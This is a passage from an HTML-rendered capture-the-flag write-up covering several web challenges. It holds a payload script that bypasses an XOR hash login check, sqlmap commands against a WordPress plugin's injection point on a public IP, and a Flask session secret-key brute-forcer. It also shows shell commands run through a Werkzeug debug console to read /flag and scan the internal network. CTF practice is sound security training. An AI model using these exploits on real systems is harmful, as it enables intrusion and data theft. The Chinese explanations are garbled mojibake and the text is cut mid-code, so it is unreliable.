self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;usersä¸­å­˜åœ¨ç”¨æˆ·åâ€œadminâ€å¯†ç ä¹Ÿä¸ºâ€œadminâ€ï¼Œè¡¨é¢ä¸Šçœ‹éœ€è¦ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸ºadmin&#x2F;adminã€‚</code></pre><p><a href="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67"><img src="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67" alt="image-20230907210222817" loading="lazy"></a></p><p>ç»§ç»­åˆ†ææºç å¯ä»¥å‘ç°eval()è¯­å¥å°†base64.b64encodeè¦†å†™ä¸ºbase64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#å½“ä¼ å…¥çš„å‚æ•°itemsä¸º2ä¸ªæ—¶è¯¥å‡½æ•°ç­‰ä»·äºæ±‚ä¸¤ä¸ªå‚æ•°çš„å¼‚æˆ–å€¼å¹¶è¿”å›ï¼Œæ‰€ä»¥å½“ä¸¤ä¸ªå‚æ•°ç›¸ç­‰æ—¶ä¸ç®¡è¯¥å‚æ•°ä¸ºä½•å€¼ï¼Œè¿”å›å€¼éƒ½ä¸º0</span><span class="token comment">#è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</span></code></pre><p><strong>è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</strong></p><p>æ¥ä¸‹æ¥ç¼–å†™è„šæœ¬å³å¯æŠŠæ„é€ çš„jsonæ•°æ®base64ç¼–ç äº”æ¬¡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:5946/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h4 id="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h4><p>æŸ¥çœ‹æºç é¡µé¢å¯å‘ç°ä¸€ä¸ªphpæ–‡ä»¶é“¾æ¥</p><p><img src="%E5%BF%83%E6%B5%B71.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ç”¨æˆ·å</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“å¯†ç </span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“åç§°</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ä¸»æœº</span><span class="token comment">// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹</span><span class="token comment">// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç </span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®åº“è¿æ¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// æ‰§è¡Œæ’å…¥</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥æˆåŠŸ'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å…³é—­æ•°æ®åº“è¿æ¥</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gptçœŸå¥½ç”¨</span></span></code></pre><p><img src="%E5%BF%83%E6%B5%B72.png" loading="lazy"></p><p>æ ¹æ®æµ‹è¯•å‘ç°timeå­˜åœ¨æŠ¥é”™æ³¨å…¥</p><p><img src="%E5%BF%83%E6%B5%B73.png" loading="lazy"></p><p>sqlmapä¸€æŠŠæ¢­</p><pre class="language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  --dbs  --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress --tables --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch</span></code></pre><h4 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h4><p>é¦–å…ˆçˆ†ç ´secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret keyæ˜¯<code>This-random-secretKey-you-can&#39;t-get06f0</code>,æœ‰äº†secret keyå°±èƒ½è‡ªå·±ä¿®æ”¹sessionä¸ºadminã€‚adminçš„privateç•™è¨€è¯´pinç 904-474-531ï¼Œæ‰€ä»¥å»åˆ°<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ï¼Œè¾“å…¥pinç åˆ™è·å¾—console</p><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>è·å¾—ç¬¬ä¸€éƒ¨åˆ†flagï¼š<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>è¿˜æœ‰ä¸ªreadmeï¼Œpython decodeåçœ‹åˆ°æç¤º</p><pre class="language-none"><code class="language-none">æ­å–œä½ é€šè¿‡å¤–ç½‘æ¸—é€æ‹¿ä¸‹äº†æœ¬å°æœåŠ¡å™¨çš„æƒé™æ¥ä¸‹æ¥ï¼Œä½ éœ€è¦å°è¯•å†…ç½‘æ¸—é€ï¼Œæœ¬æœåŠ¡å™¨çš„&#x2F;app&#x2F;toolsç›®å½•ä¸‹å†…ç½®äº†fscanä½ éœ€è¦äº†è§£å®ƒçš„åŸºæœ¬ç”¨æ³•ï¼Œç„¶åæ‰«æå†…ç½‘çš„ipæ®µå¦‚æœä½ è¿›è¡Œäº†æ­£ç¡®çš„æ“ä½œï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœ10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 openå°†ä½ å¾—åˆ°çš„è‹¥å¹²ä¸ªç«¯å£å·ä»å°åˆ°å¤§æ’åºå¹¶ä»¥ - åˆ†å‰²ï¼Œè¿™ä¸€ä¸²å³ä¸ºhint.zipå‹ç¼©åŒ…çš„å¯†ç ï¼ˆæœ¬ä¾‹ä¸­ï¼Œå¯†ç ä¸ºï¼š22-8080-9000ï¼‰æ³¨æ„ï¼šè¯·å¿½ç•¥æ‰xx.xx.xx.1ï¼Œä¾‹å¦‚æ‰«å‡ºä¸‰ä¸ªip 192.168.0.1 192.168.0.2 192.168.0.3 ï¼Œè¯·å¿½ç•¥æ‰æœ‰å…³192.168.0.1çš„æ‰€æœ‰ç»“æœï¼æ­¤ä¸ºå‡ºé¢˜äººæœåŠ¡å™¨ä¸Šçš„å…¶å®ƒæ­£å¸¸æœåŠ¡å¯¹å¯†ç æœ‰ç–‘é—®éšæ—¶å’¨è¯¢å‡ºé¢˜äºº</code></pre><p>æç¤ºç”¨fscanï¼Œçœ‹ä¸€ä¸‹help</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>æ˜¯è¿™ä¸ªå·¥å…·ï¼š <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>çœ‹ä¸€ä¸‹æœ¬æœºå†…ç½‘ip, å‚è€ƒ <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span 